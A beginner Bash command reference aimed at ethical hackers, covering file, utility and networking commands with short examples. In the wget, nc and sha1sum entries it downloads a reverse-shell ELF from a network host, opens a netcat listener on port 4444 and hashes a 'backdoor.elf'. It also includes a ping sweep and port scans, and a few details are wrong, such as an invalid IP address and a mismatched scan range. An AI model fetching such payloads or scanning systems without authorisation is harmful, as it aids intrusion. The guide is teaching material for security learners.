### Introduction
The <a id="top">acronym</a> **BASH** stands for: *Bourne Again Shell,* which is a *command interpreter* based on its predecessor, the *Bourne* shell.  This environment allows you to interact with your OS via commands, and normally runs inside your terminal, but you can also run a Bash/Shell script as a standalone executable. This guide covers some very useful Bash commands for WhiteHatters.

### Quick Guide Reference
<table>
<tr><th colspan="5">Helpful Commands</th></tr>
<tr><td><a href="#whatis">whatis</a></td>
<td><a href="#whereis">whereis</a></td>
<td><a href="#man">man</a></td>
<td><a href="#info">info</a></td>
<td><a href="#info">--help</a></td></tr>
<tr><td><a href="#sudo">sudo</a></td>
<td><a href="#top">top</a></td></tr> 
</table>
<table>
<tr><th colspan="5">Local Discovery</th></tr>
<tr><td><a href="#whoami">whoami</a></td>
<td><a href="#pwd">pwd</a></td>
<td><a href="#ls">ls</a></td>
<td><a href="#locate">locate</a></td>
<td><a href="#file">file</a></td></tr>
<tr><td><a href="#df">df</a></td>
<td><a href="#printenv">printenv</a></td></tr>
</table>
<table>
<tr><th colspan="4">Files and Directories</th></tr>
<tr><td><a href="#cd">cd</a></td>
<td><a href="#mkdir">mkdir</a></td>
<td><a href="#rmdir">rmdir</a></td>
<td><a href="#rm">rm</a></td></tr>
<tr><td><a href="#shred">shred</a></td>
<td><a href="#mv">mv</a></td>
<td><a href="#cp">cp</a></td>
<td><a href="#touch">touch</a></td></tr>
<tr><td><a href="#nano">nano</a></td>
<td><a href="#head">head</a></td>
<td><a href="#tail">tail</a></td></tr>
</table>
<table>
<tr><th colspan="3">Utilities & Programs</th></tr>
<tr><td><a href="#echo">echo</a></td>
<td><a href="#md5sum">md5sum</a></td>
<td><a href="#sha1sum">sha1sum</a></td></tr>
<tr><td><a href="#cat">cat</a></td>
<td><a href="#chmod">chmod</a></td>
<td><a href="#wget">wget</a></td></tr>
<tr><td><a href="#rsync">rsync</a></td>
<td><a href="#xxd">xxd</a></td>
<td><a href="#history">history</a></td></tr>
</table>
<table>
<tr><th colspan="4">Networking Commands & Special Characters</th></tr>
<tr><td><a href="#tilde">(~) Tilde & (|) Pipe</a></td>
<td><a href="#special">Special Char(s)</a></td>
<td><a href="#host">host</a></td>
<td><a href="#dig">dig</a></td></tr>
<tr><td><a href="#whois">whois</a></td>
<td><a href="#tcpdump">tcpdump</a></td>
<td><a href="#ifconfig">ifconfig && iwconfig</a></td>
<td><a href="#ifup">ifup && ifdown</a></td></tr>
<tr><td><a href="#ping">ping</a></td>
<td><a href="#arping ">arping </a></td>
<td><a href="#nc">nc</a></td>
<td><a href="#nmap">nmap</a></td></tr>
<tr><td><a href="#dhclient">dhclient</a></td>
<td><a href="#nmcli">nmcli</a></td>
<td><a href="#netstat">netstat</a></td>
<td><a href="#ufw">ufw</a></td></tr>
</table>

Many Bash commands are intuitive, for example you could fire up a terminal and ask: **<a id="whatis">whatis</a>**
	<pre>$ whatis bash <br>bash (1)    - GNU Bourne-Again SHell</pre>

To locate source files, man pages and executables use this command: **<a id="whereis">whereis</a>**
<pre>$ whereis bash
bash: /bin/bash /etc/bash.bashrc /usr/share/man/man1/bash.1.gz</pre>
<br>

### Helpful Commands
**1. <a id="man">man</a>** <br>
It is very important to learn how to find help when using terminal commands. Most **.nix**  systems include built-in manual pages to get information about almost any command such as: proper syntax, options, attributes, and even examples of correctly formatted commands.
<pre>$ man commandName</pre>
<pre>$ man man</pre>
Man displays the manual page entry for a given command.<br>

**2. <a id="info">info</a>, -h, and --help** <br>
The info command shows helpful information about most Bash commands. For a shorter version of the available help pages, try the command name followed by either *-h or --help.*
<pre>$ info commandName</pre>

<pre>$ chmod --help </pre>
Both *info and --help* show useful command options and syntax.

**3. <a id="sudo">sudo</a>** <br>
Some commands need to be executed with SuperUser or root authority. If you are not logged in as root user on a Unix/Linux/Apple OSX/etc. machine, use *sudo* followed by the command you want to be executed as root user.
<pre>$ sudo ifconfig</pre>

SuperUser do this commandName
<pre>$ sudo su</pre> Sudo switch user, escalate my privileges to SuperUser.

**3. <a id="top">top</a>** <br>
The top program provides a real-time view of a running system. It can display system summary information as well as a list of processes or threads being managed by the kernel. 
<pre>$ top</pre>

### Local Discovery
**A. <a id="whoami">whoami</a>**<br>
One of the first things to do is to find out who you are, what permissions you have and what is your current working directory.  Am I logged in as root or just another user?</pre>
<pre>$ whoami</pre>

**B. <a id="pwd">pwd</a>**<br>
Print Working Directory is a simple command that prints your current working directory. This is how you find out where you are in a Linux/Unix file structure.
<pre>$ pwd
$ /home/user/Desktop/Apps</pre>

**C. <a id="ls">ls</a>**<br>
The LS command is widely used and lists information about files and directories. Defaults to the current directory.
<pre>$ ls -lia /home/user</pre>
List -a: all, including hidden files/dirs in -l: long list format, -i: include the Inode index

**D. <a id="locate">locate</a>**<br>
If you are trying to locate a particular file this command works well. It is sometimes necessary to run the *updatedb* command first before using *locate* because updatedb refreshes your machine's file database index.
<pre>$ updatedb</pre>

<pre>$ locate foo.bar
$ /home/user/Documents/foo.bar</pre>

**E. <a id="file">file</a>**<br>
In **Unix/Linux** environments, file extensions don't tell us much about what kind of file we're dealing with. For instance you could name a file: myfile.mine and make it executable by setting the file's executable bit: *Chmod u+x fileName.* However, you can use *file* followed by the file name to discover the file's type.
<pre>$ file foo.bar
$ ASCII text</pre>

**F. <a id="df">df</a>**<br>
This program displays the amount of disk space available on the file system containing each file name argument. Filename is optional.
<pre>$ df </pre>

**G. <a id="printenv">printenv</a>**<br>
Printenv prints environment variable values. If no variables are specified, it prints the value of every environment variable. Otherwise, it prints the value of each VARIABLE that is set, and nothing for those that are not set.
<pre>$ printenv </pre>
<pre>$ printenv PATH
$ /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</pre>
You can specify the environment variable that you would like to print such as HOME, PATH, USER, etc. Remember to use caps for the variable name, as they are case-sensitive.

### Files and Directories
**1. <a id="cd">cd</a>**<br>
Change directories, from the current working directory to a /new/location.
<pre>$ cd ../home/user</pre>
Changes directory to the (..) parent directory of /home/user<br>

**2. <a id="mkdir">mkdir</a>**<br>
Make a new directory.
<pre>$ mkdir /var/www/html/NewWebsite</pre>

**3. <a id="rmdir">rmdir</a>**<br>
Remove a directory. Note: a directory must be empty before deleting it, unless you use additional parameters with *rmdir* to delete a dir and its subdirectories forcefully.
<pre>$ rmdir /var/www/html/OldWebsite</pre>

**4. <a id="rm">rm</a>**<br>
Remove or delete files and directories. Options include: -f: force, don't prompt me. -r: recursive, delete directories and their contents recursively.
<pre>$ rm -rf Deleteme/</pre>

**5. <a id="shred">shred</a>**<br>
Note that if you use rm to remove a file, it might be possible to recover some of its contents, given sufficient expertise and/or time. For greater assurance that the contents are truly unrecoverable, consider using shred. Options include: -u: truncate and remove file after overwriting. -v: verbose, show progress. -z: add a final overwrite with zeros to hide shredding
<pre>$ shred -vzu /home/myTop/Secret/File.txt</pre>

**6. <a id="mv">mv</a>**<br>
Move a file from location A to location B and/or rename it.
<pre>$ mv /home/user/mydoc.php /home/user/Anotherdoc.php</pre>

**7. <a id="cp">cp</a>**<br>
Copy a file to a new location, but the old file remains by default.
<pre>$ cp myfile_Name.docx /home/usr/path/NewName.docx</pre>

**8. <a id="touch">touch</a>**<br>
Create an empty file, or modify the file's time-stamp, Date accessed, & Date modified.
<pre>$ touch file_1.sh</pre>

**9. <a id="nano">nano</a>**<br>
Edit an existing file or create a new one if it doesn’t exist with nano, one of the many command line text editors. Nano also performs syntax highlighting when you name a file with a relevant extension. For example: *nano file.php* will create/edit this file.php, in the local directory and display highlighting for the PHP syntax.
<pre>$ nano /path/to/file/Index.html</pre>
**10. <a id="head">head</a>**<br>
The opposite of tail, use to display the head of a file.
<pre>$ head access.log</pre>
**11. <a id="tail">tail</a>**<br>
The opposite of head, displays the tail end of a file.
<pre>$ tail access.log</pre>
### Utilities & Programs
**a. <a id="echo">echo</a>**<br>
Used in many programming languages, *echo* displays a line of text to *stndout*. However you can use special parameters like: > to print to a file and overwrite it if it already exists. Also: >> which means append output to a file, or: < which is used for output redirection, some call it input. Other options: -e: enable interpretation of backslash escapes:\f: form feed, \n: new line \r: carriage Return. The following command appends a string to the end of list.txt with a new line in between.
<pre>$ echo -e "this line\n of text" >> list.txt</pre>
**b. <a id="md5sum">md5sum</a>**<br>
The program md5sum is designed to verify data integrity using the MD5 (Message-Digest Algorithm 5) 128-bit cryptographic hash. MD5 hashes used properly can confirm both file integrity and authenticity. When you download any file or application, always run a strong hashing function to be sure the file has not been tampered with.
<pre>$ md5sum ubuntu-16.04.2-server-amd64.iso</pre>
**c. <a id="sha1sum">sha1sum</a>**<br>
The sha1sum utility is also used to verify file integrity, using an Algorithm that produces the sha1checksum (hash value: fingerprint) of a file. The Hash is printed to *stdnout*, which in our case is the terminal screen.
<pre>$ sha1sum backdoor.elf</pre>
**d. <a id="cat">cat</a>**<br>
CAT is an acronym for concatenate. It combines: concatenates, files or prints text and files to the standard output. The first command concatenates two files and outputs the results to a third file. The second command simply displays the contents of the file to *stndout*.
<pre>$ cat file_1 file_2 > Combined_File_3</pre>
<pre>$ cat nally.txt</pre>
<pre>$ cat ./-weird_Office-file_name(2).docx.docx</pre>
Display a file with a dash in the name with (./)

**e. <a id="chmod">chmod</a>** <br>
Change mode allows you to change file mode bits. In **.nix** environments, file and folder permissions are displayed with the ls command, beginning with: Directory/Link: 1 bit, followed by: user/group/owner with 3 bits each: (-DUUUGGGOOO) The: + operator adds selected file mode bits, and: - removes them. So to give the current user and group execute permissions on a file try this first command. The second command shows how to execute the file with (./).
<pre>$ chmod ug+x Endless_ping_loop.sh</pre>
<pre>$ ./Endless_ping_loop.sh</pre>
**f. <a id="wget">wget</a>**<br>
This neat tool is known as the non-interactive network downloader. And it does just that, this command downloads a file from a remote server.
<pre>$ wget http://192.168.53.4/files/Reverse_Tcp-shell.elf</pre>
**g. <a id="rsync">rsync</a>**<br>
Used to backup and copy files based on changes in them. At some point, current technologies like Dropbox and others use utilities similar to rsync in order to keep your data synchronized with what's in the cloud. Rsync can also backup over the network using ssh. Read MAN page! Local backup: -a: archive, -z: compress data during transfer, -v: increase verbosity
<pre>$ rsync -azv /path/folder1/macs.db /path/folder2/macs_copy.db</pre>
**h. <a id="xxd">xxd</a>**<br>
Make a hexdump or do the reverse. This simple command uses -r: reverse, to convert a hexadecimal file to binary format.
<pre>$ xxd -r  original.hex reverse.bin</pre>
**i. <a id="history">history</a>**<br>
This simple command shows a numbered list of the previous commands you have entered since you last erased your Bash history.
<pre>$ history</pre>
<pre>1 ls -ali
2 cd ../our/parents/child/dir
3 whoami
4 echo hello > foo.bar</pre>
If you want to run any previous command, just use: !#number
<pre>$ !3
$ root</pre>
### Networking Commands and Special Characters.

## Special Characters
These are some of the many special characters that can be used with commands in the Bash terminal/command prompt.<br>

**<a id="tilde">~ Tilde</a>**<br>
The tilde represents the home directory. When followed by a (/), or used alone it means the current user's home directory.
<pre>$ cd ~</pre>
**<a id="tilde">| Pipe</a>**<br>
The true power of Bash/Shell commands is realized when you chain multiple commands together. The output of one command becomes the input of another command, for as many commands as you can chain together.
<p>The following command says: cat display access.log, and pipe the output to cut -d: delimit or separate on tab/blank space, -f: display field 1, pipe that output to grep $this_Ip_addr, then pipe the output to sort, which -u: uniquely sorts the results by -rn: showing the most occurring line in access.log with $thisIP in descending order.</p>
<pre>$ cat access.log | cut -d " " -f 1 | grep '208.68.234.99' | sort -urn</pre>

**<a id="special">$() Expansion, (&&) And, (;) End command, (#) Comment</a>**<br>
The expansion characters allow you to expand parameters, substitute commands or use arithmetic expressions. Two ampersands represent and, which means you can execute more than one command, but be sure to end long statements or multiple commands with (;) semi-colon. Finally, the (#) hash tag is used for a line of comments, this line is ignored by the bash interpreter.<br>
The First command uses a bash for statement, to loop through a $(sequence) of numbers, 1-254 to be exact, and do a ping -c: count 1, piping the output to grep to only display alive nodes. This is a quick way for a pentester to check what nodes are alive on this network. The first node pinged is 192.x.x.1.
<pre>$ for ip in $(seq 1 254); do
# only prints live hosts as evidenced in the 'bytes from' received from the host.
ping -c 1 192.168.42.$ip | grep "bytes from"
done;</pre>
<pre>$ sudo apt update && apt list --upgradable -va && sudo apt upgrade;</pre>
This is self explanatory, it says: sudo do aptitude check my repo(s) in: /etc/apt/sources.list for updates, next list all upgradeable packages -v: verbosely, tell me something, while -a: listing all package versions, then perform the upgrade as sudo.

**1. <a id="host">host</a>** <br>
DNS lookup utility. Options: -t: querytype, -l: zone transfer by listing all known hosts in domain. The first command performs forward lookup. Second command does reverse lookup and restricts the -t: Query-type, to ns: Name Server records.
<pre>$host www.cisco.com</pre>
<pre>$ host -t ns 22.23.144.81 </pre>
 **2. <a id="dig">dig</a>** <br>
Dig for Domain Name Server records. Can also use batch mode to read lookups from a file. Without any options Dig performs a forward lookup, and by default returning IPV4 records.
<pre>$ dig hackthissite.org</pre>
 **3. <a id="whois">whois</a>** <br>
Whois is a client for the whois directory service. Options: -h: host connect to, -p: port connect to
<pre>$ whois www.usf.edu</pre>
 **4. <a id="tcpdump">tcpdump</a>** <br>
A command line alternative to wireshark, tcpdump dumps traffic on a wire. This command says tcpdump -i: interface named wlan0, and -e: print the link-level header/MAC layer address, and the 802.11 wireless protocol information.
<pre>$  tcpdump -ie wlan0</pre>
**5. <a id="ifconfig">ifconfig && iwconfig</a>** <br>
Ifconfig is an interface management and configuration utility, It can be used to bring an interface up, set interface metrics, set a network address and other things. Iwconfig is similar, only it is used to set wireless network interfaces.
<pre>$ ifconfig</pre>
<pre>$ iwconfig wlan0 down</pre>
**6. <a id="ifup">ifup && ifdown</a>** <br>
Bring a network interface up or bring it down. Run the commands with -h or --help for more info on options. The first command brings the iface named: eth0 down if it is up, and then brings it up, this is equivalent to a restart of the network iface. The second command brings down several network interfaces at once.
<pre>$ ifdown eth0 && ifup eth0</pre>
<pre>$ ifdown eth0 eth1 eth2</pre>
**7. <a id="ping">ping</a>** <br>
Ping is a well known networking utility used to send Icmp echo requests to Network nodes to test connectivity. Options: -c: count, number of pings, -t: ttl time to live -s: packet-size -4/6: IPV.
<pre>$ ping 192.168.1.2 -c 4</pre>
**8. <a id="arping">arping</a>** <br>
Arping is used to send ARP requests to local Network hosts. ARP requests attempt to match OSI level 3 Network/IP addresses with level 2 MAC addresses. 
<pre>$ arping -i eth1 192.168.2.300</pre>
**9. <a id="nc">nc</a>** <br>
Netcat is known as the TCP/IP Swiss army knife. Among other things, its mainly used to read/write data across network connections. Nc can act as client or server, listening for a connection or making one and also is a handy port-scanner as well. The first command says: netcat connect to this $IP.Addr -v: verbosely, -n: no DNS queries please, - w: number of seconds timeout for connects -z: zero input/output mode, means don't try to connect just check if the port is open, scan ports 1-50000.
<pre>$ nc -vn -w 2 192.168.1.5 -z 1-50000</pre>
<pre>$ nc -nlvp 4444 </pre>
Netcat, set listener on local port 4444. -n: No DNS, -v: be verbose, and -l: listen for incoming connections.

**10. <a id="nmap">nmap</a>** <br>
The network mapper is a Port Scanner, Network exploration tool, and active, not passive scanner. Which means nmap scans generate lots traffic so let the pentester beware. You should only run nmap on a machine you own or with the permission of its owner. The first command runs an -A: aggressive scan of the test domain which includes many types of scans such as OS/version detection, additional nmap scripts and traceroute for network hops of each node to name a few. The scan is to be conducted as quickly as possible -T4: fast timing.
<pre>$ nmap -A -T4 scanme.nmap.org</pre>
<pre>$ nmap -sn -v -n 10.10.33.1-254 </pre>
This command tells nmap to perform a ping scan on a range of hosts (10.10.31.1-254), do not perform a Domain Name query of the hosts -n:no DNS, and be -v:verbose about it.

**11. <a id="dhclient">dhclient</a>** <br>
DHCP configuration is handled by dhclient on Linux/Unix machines. It can be used to view your IP address lease(s), and also to release or renew IPv4/IPv6 addresses. To see the dhclient conversation with the dhcp server just try: -v verbose. Other options: -r: release IP addy, -4: renew IPv4 address.
<pre>$ dhclient -v</pre>
**12. <a id="nmcli">nmcli</a>** <br>
The network manager command line utility can be used to show networking information. Here we tell it to show network devices, and pipe the output to grep any line containing the word DNS in it, which is equivalent to the IP address of your DNS server.
<pre>$ nmcli dev show | grep DNS</pre>
**13. <a id="netstat">netstat</a>** <br>
Networking statistics, prints network connections, routing tables, masquerade connections, iface stats, etc. Options: -a: all, -n: show numerical addresses, -t: tcp connections, p: show the PID and name of the program to which each socket belongs.
<pre>$ netstat -antp</pre>
**14. <a id="ufw">ufw</a>** <br>
Ubuntu's default firewall config tool is ufw: uncomplicated firewall. It is disabled by default and was developed to ease iptables firewall configuration. To turn UFW on with the default set of rules:
<pre>$ sudo ufw enable</pre>

This guide is a work in progress and is in no way complete. The commands here are only the very tip of the iceberg when it comes to the *Bash* terminal's capabilities. More commands to come as this guide continues to be updated.<br>

Return to <a href="#top">Top</a>.
